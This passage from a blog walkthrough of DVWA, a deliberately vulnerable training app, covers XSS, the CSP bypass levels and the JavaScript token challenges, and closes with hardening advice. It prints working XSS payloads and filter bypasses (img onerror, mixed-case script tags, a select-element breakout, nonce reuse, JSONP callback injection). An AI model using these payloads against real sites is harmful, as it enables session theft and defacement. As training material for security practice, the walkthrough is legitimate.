There is a select with different values as the language options. As there is no validation, we can append a script in this manner: **?default=Englishalert(‘DOM+XSS')**.

![Low DOM XSS DVWA](https://bughacking.com/wp-content/uploads/2021/04/low-dom-xss-dvwa.png)

**Medium**

Even though direct script evocation is not allowed in the medium DVWA XSS DOM example, there is a way to bypass it:

    /vulnerabilities/xss_d/?default=English>/option></select><img src='x' onerror='alert(1)'>

As a result script will fire:

![Script will Execute After Adding it to the Onerror](https://bughacking.com/wp-content/uploads/2021/04/medium-dom-xss-dvwa.png)

**High**

While the context of the vulnerability suggests that the exploitation will become harder, actually exploit DOM XSS on high level is as easy as on the low level. By adding **#** to one of the ``<select>`` values, you can execute code on the client's side without worrying about the whitelist values.

![Everything after the Hashtag is not Sent to the Server ](https://bughacking.com/wp-content/uploads/2021/04/high-dom-xss-dvwa.png)

**Impossible**

As the URL content is encoded, it is not possible to exploit the vulnerability on this level.

### XSS (Reflected)

Reflected is another type of the XSS. This injection is not persistent, one of the examples of how this can be exploited is when the user is tricked to click on a malicious link.

**Low**

Exploiting reflected XSS on low level is easy – all you need to do is to submit a **<script>alert(‘Reflected XSS')</script>**.

![Reflected XSS on DVWA Low Level](https://bughacking.com/wp-content/uploads/2021/04/reflected-xss-on-low-level.png)

**Medium**

Even though ``<script>`` is rejected on this level, writing it with uppercase letter will not affect the functionality, but would bypass the filter: ``<ScriPt>alert(‘Reflected XSS')</script>``.

**High**

On this level ``<script> `` is whitelisted and using uppercase letters or spaces won't help. However, [other events are not prohibited](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).
````html
    <img src/onerror=alert('XSS+Reflected')>
````
**Impossible**

A function that escapes any "illegal" characters is used.

### XSS (Stored)

Stored XSS is permanently stored on the website and malicious scripts can be executed every time user visits the page. For example, if a website is vulnerable and a script is injected into comments form, every users' browser will execute it on page visit.

**Low**

Stored XSS does not differ from the reflected XSS by its nature. Payloads used in the previous section would work for stored XSS.

But the task for the stored XSS DVWA vulnerability is to make a redirect to an external page. We can do this in different ways, one of them is to add an ``<img>`` element that, on error, opens a page:

````html
<img src="https://nonexisting.url" onerror=window.open("https://www.owasp.org","xss",'height=500,width=500');>

````

As the text field has a max size of 50 characters, we have to extend it, otherwise our payload won't fit the field.

![Increasing Max Length of the Field](https://bughacking.com/wp-content/uploads/2021/04/low-dvwa-stored-xss.png)

After submitting the **img element** it should be saved in the guestbook. Each time user visits this page, another browser window will be opened with owasp.org. Keep in mind that for the first time **you will get an alert that the browser blocked popups.** After allowing the popups, you will see this:

![Another Page was Opened on the Stored Cross Site Scripting Vulnerability Page](https://bughacking.com/wp-content/uploads/2021/04/stored-xss-opened-another-page.png)

**Medium**

What worked out for us with the low stored XSS level, will not work with the medium. You can try submitting the same payload in the message field, but you will see that nothing happens.

But the thing is that not all fields have the same validation. The same payload will work for the **Name** field. Before entering the value, make sure you increased the **maxlength** of the field (refer to the previous section).

![Submitting the Payload to the Name Field Instead of Message](https://bughacking.com/wp-content/uploads/2021/04/medium-level-stored-xss-dvwa-name-field.png)

If you've used payload from the low security level, you will get an error:

Data too long for column 'name' at row 1.

This is related to the database column length and can be solved by using a shorter payload:

    <img src="https://nonexisting.url" onerror=window.open("https://www.owasp.org");>

This should lead into an **owasp** website opened each time user visits this page.

![XSS Payload was Stored Successfully](https://bughacking.com/wp-content/uploads/2021/04/medium-level-stored-xss-external-website-opened.png)

**High**

The high level removes symbols that the word **script** has. This means that our payload, which we've used for low and medium levels, won't be effective, as the T from the **https is not allowed**. The submitted payload would look like this: **Name: ps://www.owasp.org");>**.

Instead of this, we can try payload without https://:
````html
    <img src="https://nonexisting.url" onerror=window.open("www.owasp.org");>
````
This will not load a page, but the fact is that another page will be opened. And this proves the existence of the stored XSS.

![XSS Unsuccessfully Tries to Redirect to the OWASP Page](https://bughacking.com/wp-content/uploads/2021/04/high-severity-dvwa-xss-stored.png)

If you are curious how would this vulnerability could have a potentially higher impact, you can try other payloads from the [Portswigger XSS Cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).

**Impossible**

Implemented **htmlspecialchars()** function filters all dangerous characters.

### CSP Bypass

[Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) defines what resources can be used on the page. If the policy is set and it disallows external resources, then no external script could be loaded and executed.

**Low**

For the DVWA, checking if the CSP is implemented, is easy. Actually, this is the same for any case – the server responds with a **Content-Security-Policy** header that states what external resources are allowed.

**Content-Security-Policy: script-src ‘self' https://pastebin.com hastebin.com example.com code.jquery.com https://ssl.google-analytics.com ;**

And in this case, **self**, **pastebin, hastebin, example, code.jquery**, and **ssl.google-analytics** are allowed.

![Allowed Resources for Low DVWA CSP Vulnerability](https://bughacking.com/wp-content/uploads/2021/04/low-security-csp.png)

Even though Pastebin is one of the domains allowed by the policy, it is [not possible to use Pastebin for low DVWA CSP level because of the changes in Pastebin website](https://github.com/digininja/DVWA/issues/382). Even though we are able to load content from the page, it will be **text, not script** format.

As the **‘self'** is allowed in the CSP, we can host our own script from the DVWA server. Create a new file in the **/var/www/html** directory of your DVWA installation and put a single line with an alert: **alert(‘CSP is working')**.

![Creating a JS Script for low CSP Exploitation](https://bughacking.com/wp-content/uploads/2021/04/low-csp-security-creating-new-script.png)

After this, try to load the script by submitting URL with the script – **http://10.0.1.42:8081/low-csp.js**.

![Script was Loaded Successfully for the Low Level DVWA CSP Vulnerability](https://bughacking.com/wp-content/uploads/2021/04/low-dvwa-csp-loaded-successfully.png)

As a result, script will be executed.

**Medium**

The medium level still does allow self script includes, but requires a script to match [nonce](https://en.wikipedia.org/wiki/Cryptographic_nonce) that is also defined on the server. After observing a few responses, we can see that this is a security risk, as the nonce is the same every time.

![Nonce is the Same Every Time on High CSP Level](https://bughacking.com/wp-content/uploads/2021/04/medium-csp-nonce-is-the-same.png)

And now comes the interesting part – we will have to chain multiple vulnerabilities and exploit **File Upload**. As the Medium security level is set, refer to the previous sections of this article if you do not remember how to exploit it.

**Upload the file** created in the Low level explanation **by using [File Upload on DVWA](/dvwa-ultimate-guide-first-steps-and-walkthrough/#File_Upload)**.

As we intercepted request and we know the nonce, we can use it for constructing a payload. It will look like this:
````html
    <script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=" src="/hackable/uploads/low-csp.js"></script>
````
We have to use the ``<script>`` element as unlike with the Low level, the medium does not wrap our script with the **``<script> ``element** And a nonce is needed for the CSP to be effective. Another crucial detail is setting a source, which is the **/hackable/uploads/low-csp.js** that points to the location of a file that we just uploaded.

![Entering a Script Element with Nonce and Source Pointing to Uploaded Script](https://bughacking.com/wp-content/uploads/2021/04/entering-payload-for-medium-level.png)

After this, script should be executed

![Payload was Submitted Successfully](https://bughacking.com/wp-content/uploads/2021/04/low-dvwa-csp-loaded-successfully-1.png)

**High**

On this level, there is a **Solve the sum** button that calls a script that "calculates" the value of the hardcoded numbers and returns the sum. A GET request is sent that has a callback solveSum that returns us the result: **/vulnerabilities/csp/source/jsonp.php?callback=solveSum**.

What we can do is to intercept the request and instead of the **solveSum**, inject our own value. Let's say we want to inject an alert:

![Alert Added as a Callback for High DVWA CSP](https://bughacking.com/wp-content/uploads/2021/04/jasonp-changing-value-to-alert-1.png)

And as a result, the code will be executed:

![Script was Executed Successfully for the High DVWA CSP Vulnerability](https://bughacking.com/wp-content/uploads/2021/04/high-dvwa-csp-script-loaded-successfully.png)

**Impossible**

Just like in the high level, JSONP is used for calling a callback function. However, this tame the function is hardcoded and there is no possibility to add custom code.

### JavaScript

While JavaScript scripts can't be called as the vulnerabilities itself, it can definitely become an attack vector. And also, in some cases JavaScript script can give an attacker useful information that might lead to further system exploitation. DVWA JavaScript vulnerability focuses on showing what can be the potential consequences if a script contains sensitive information.

**Low**

There is an easy task (at least it looks easy) – enter word "success" and hit Submit. However, the problem you will face is the token. Token will be invalid.

![DVWA JavaScript Low Level Vulnerability](https://bughacking.com/wp-content/uploads/2021/03/low-1-1.png)

However, the purpose of the DVWA JavaScript vulnerability is to reverse engineer JavaScript code to get the needed information. Such information will help to exploit vulnerability. First step would be to locate JavaScript code. This can be done by inspecting page HTML. You will that there is a JS code included inside the <script> element. One function is really interesting for us. It consists of the logic for creating token, which we need.

![Creating Token for DVWA JavaScript Low Severity Vulnerability](https://bughacking.com/wp-content/uploads/2021/03/low-2-1.png)

Now we know that we can construct token by using ROT13 function and generating a MD5 hash. If you are on Kali Linux, this can be done easily with the terminal only:

**echo -n ‘success' | tr ‘A-Za-z' ‘N-ZA-Mn-za-m' | md5sum**

As a result, token will be generated – **38581812b435834ebf84ebcc2c6424d6**.

Let's try to send a request, this time with the correct token. Intercept request with Burp Suite and edit the token.

![Newly Generated Token Added to the Request](https://bughacking.com/wp-content/uploads/2021/03/low-3-1.png)

And BINGO. We managed to get the phrase ‘**Well done!'** instead of the **‘Invalid token'**.

![JavaScript DVWA Vulnerability was Exploited Successfully in the Low Security level](https://bughacking.com/wp-content/uploads/2021/03/low-4.png)

**Medium**

This time the script is minimized and it will be harder for us to read it. Try to find the script and open it (the script is called **medium.js**). Alternatively, after you made a request, you can go to the Debugger tab of the browser, find the script, and use the Pretty print source function, if you are using the Firefox browser. This will make the script more human-readable by formatting it.

![DVWA Medium JavaScript Vulnerability Formatting the Script](https://bughacking.com/wp-content/uploads/2021/04/medium.png)

Now we can analyze the code. We can see that **setTimeout()** calls a function that passes ‘XX' to the **do\_elsesomething()** function. The **do\_elsesomething()** function sets token to the value of received value plus entered phrase plus ‘XX' that is passed to the **do\_something()** function. If this sounds complicated, take a look at the code again. I really encourage you to try to execute the function by yourself, either in the browser or IDE or even in your mind, in order to get the correct token.

I've edited the code and ran it in code editor. It generated and printed the correct token.

![](https://bughacking.com/wp-content/uploads/2021/04/medium-2.png)

Just like in the previous step, we can use Burp Suite to send the request with a found-out token. And … BINGO. The wanted **Well done!** is here instead of the devastating **You got the phrase wrong** or **Invalid token** phrases.

**High**

Identically as with the case of medium DVWA JavaScript, we have a script, this time called **high.js**, After formatting it, we might see that it looks differently.

![](https://bughacking.com/wp-content/uploads/2021/04/dvwa-javascript-high-1-1024x462.png)

That's because JavaScript code is [obfuscated](https://blogs.akamai.com/sitr/2020/10/catch-me-if-you-can---javascript-obfuscation.html). There are a few hints on the page that tells what tools were used for obfuscating. There is also a website that will help to deobfuscate the code – [https://deobfuscatejavascript.com](https://deobfuscatejavascript.com). We can enter the code from JavaScript file and see what we will get.

![](https://bughacking.com/wp-content/uploads/2021/04/dvwa-javascript-high-2.png)

Even though the code transformed, it's still pretty hard to understand it. However, even most of the code is not beneficial for us, last lines of the code is what we need:

````js
    (function() {
        'use strict';
        var ERROR = 'input is invalid type';
        var WINDOW = typeof window === 'object';
       
        .........................
        .........................
       
    function do_something(e) {
        for (var t = "", n = e.length - 1; n >= 0; n--) t += e[n];
        return t
    }
    function token_part_3(t, y = "ZZ") {
        document.getElementById("token").value = sha256(document.getElementById("token").value + y)
    }
    function token_part_2(e = "YY") {
        document.getElementById("token").value = sha256(e + document.getElementById("token").value)
    }
    function token_part_1(a, b) {
        document.getElementById("token").value = do_something(document.getElementById("phrase").value)
    }
    document.getElementById("phrase").value = "";
    setTimeout(function() {
        token_part_2("XX")
    }, 300);
    document.getElementById("send").addEventListener("click", token_part_3);
    token_part_1("ABCD", 44);
````
It contains of the logic for generating token. We can reverse engineer the sequence and we can see that there four functions in total:

*   token\_part\_2
*   token\_part\_3
*   token\_part\_1
*   do\_something

There are two ways how you can manage this task – by trying to run the code (with a small changes derived from the code investigation) and see what happens, or to analyze everything line by line, try to understand the logic and solve the task by yourself with a help of some tools (only where this is needed). For this example, we will choose the second approach.

For running the JavaScript code you can use any code editor you want. You might even use the browser. Just choose the method that you like the most. I used [Atom editor](https://atom.io/) for this example. If you might want to try it, [there is a video how you can make JavaScript code run in the Atom editor.](https://www.youtube.com/watch?v=_k_pTbHB04A)

What we should do next is to get the token from the page as this value is needed for the defined JS functions. After inspecting the page we can see that the token is **ecc76c19c9f3c5108773d6c3a18a6c25c9bf1131c4e250b71213274e3b2b5d08**. This token is the same for every request.

Now let's get back to the code chunk we have. So far we know that there are 4 functions that have to be called in a specific order. Initially it might look that the **token\_part\_2** will be called before **token\_part\_3**. However, it is inside the **setTimeout** function, that will delay the call for **300 ms**, An educated guess might be that **token\_part\_2** invocation will be put on sleep and in the meanwhile, **token\_part\_3** will execute. After that **token\_part\_2** will be run, and lastly, **token\_part\_1**. We can run a small test and see if this guess is correct:

![Guessing the Functions Execution Sequence High JavaScript DVWA](https://bughacking.com/wp-content/uploads/2021/04/guessing-the-functions-sequence-high-javascript-dvwa.png)

Ok, so from this example we might guess that **the real sequence** is **token\_part\_3**, **token\_part\_1**, and lastly, **token\_part\_2**. But then again, this code can say nothing and might not be accurate as only the console.log() was used in this example, while the real code uses **sha256 function** and logic differs a little bit between functions.

Another indication that the **token\_part\_3** is the first function that is called, can be seen pretty easily. If we intercept the request we can see that the the token is different:

![](https://bughacking.com/wp-content/uploads/2021/04/intercepted-request-high-javascript.png)

Token is different than the initial. Reason for this is that we call the **token\_part\_3** by clicking on Submit button. This is the code part that proves this: **document.getElementById("send").addEventListener("click", token\_part\_3);**.

Moving along, logic of the three mentioned functions can be broke down into this:

*   **token\_part\_3** – generates sha256 hash of the string that is constructed from token + "ZZ". And we already know that this value is equal to **28638d855bc00d62b33f9643eab3e43d8335ab2b308039abd8fb8bef86331b14**.
*   **token\_part\_1** – passes our phrase ("success") to the do\_something function, returned string assigns to the token variable. And what the **do\_something** function does, is some operations with the string characters.
*   **token\_part\_2** – function generates the hash of "XX" + value of the token.

After the **token\_part\_3** was executed, **token\_part\_1** sets the token to **sseccus** (product of the **do\_something**). So, the hardly generated previous token value is overwritten.

And lastly, the function **token\_part\_2** constructs a string **XXsseccus** and generates a **sha256 value** of it. We can do this with a simple command on Kali Linux: **echo -n XXsseccus | sha256sum**. The result of it is **7f1bfaaf829f785ba5801d5bf68c1ecaf95ce04545462c8b8f311dfc9014068a.** This is our final token. Set the input field value to the token, enter "success" phrase, hit Submit, and done!

![Last Step of The JavaScript Vulnerability](https://bughacking.com/wp-content/uploads/2021/04/last-step-of-dvwa-javascript-high-1.png)

**Impossible**

With the Impossible level of the DVWA JavaScript you will see a philosophical, yet accurate phrase:

You can never trust anything that comes from the user or prevent them from messing with it and so there is no impossible level.

**Are there any DVWA alternatives?**
------------------------------------

There are plenty of similiar applications. I already mentioned that there are more than a dozen OWASP apps. I've made a long list with the potential DVWA alternatives, but if you are in a hurry and you are thriving for new security challenges (I know that feeling), here are a few apps you might proceed to:

*   [bWAPP](http://www.itsecgames.com/)
*   [OWASP Mutillidae II](https://github.com/webpwnized/mutillidae)

All of the mentioned applications are great alternatives to DVWA, as they all have OWASP Top Ten vulnerabilities implemented. It is very important to keep practicing the things you've learned, as there is no golden bullet for, let's say, finding SQLi vulnerabilities. The better you know the basics, the higher chance you will be able to identify vulnerabilities in the wild. And solid grounds are very important if you are seeking a bug bounty hunter career or just trying to level up as a security tester.

How to harden DVWA installation?
--------------------------------

If you **DO want to install DVWA on your main machine**, make sure at least some of the security measures are implemented. The most straightforward way to prevent outsiders from reaching your web application (although, this is definitely not the best one), is to set basic authentication. Every time someone would want to access the application, he or she would have to enter a username and password. This will ensure that no unrelated users would be able to access the application. But keep in mind the basic authentication is not the silver bullet and it is not the safest way to secure DVWA, however, this is better than nothing.

You can set the DVWA application's basic auth for XAMPP by editing. htaccess file that is already created in **C:\\xampp\\htdocs** folder. Append a few more additional lines to the file contents:
````
_AuthType Basic_

_AuthName "Password Protected Area"_

_AuthUserFile .htpasswd_

_Require valid-user_
````
Another thing you must do, is to create a **.htpasswd** file in the **C:\\xampp\\apache\\** folder. You can declare username and password inside the file like this:

dvwa-sec:$2y$10$2M81XPUwreBzuyUaA5DkYeb7vnPhHXlhEfujQ49UTDEny6I5AxA6W

In this case, I want the username to be **dvwa-sec**, and I want it to have **dvwa-is-sec3rE** password. But as you know, saving passwords in plain text is not secure. [You can use this generator](https://hostingcanada.org/htpasswd-generator/) that will encode your password in bcrypt or any other algorithm you might want to use. I used **bcrypt** for this example, you might use other algorithms, however, keep that in mind that not all of them provide efficient security for your password.

Save the username and password in **.htpasswd** file and restart the Apache (stop and start it from the XAMPP Control Panel). Next time you will visit localhost, you will be asked for **username** and **password**.

![Basic Auth Set for the Installation Server](https://bughacking.com/wp-content/uploads/2021/03/basic-auth.png)

I already mentioned this previously, but if you want DVWA to be secure, install it on a virtual machine that has NAT networking mode.

**Final Words**
---------------

If you've managed to finish all challenges all by yourself, this is great. However, don't worry if some of the vulnerabilities are unclear to you. Understanding how each of them can be exploited takes time and requires practice. There are many examples of how these vulnerabilities can be exploited in the wild, but before continuing with the next steps of the web application penetration testing journey you must have solid basics. And DVWA is great for providing these basics.
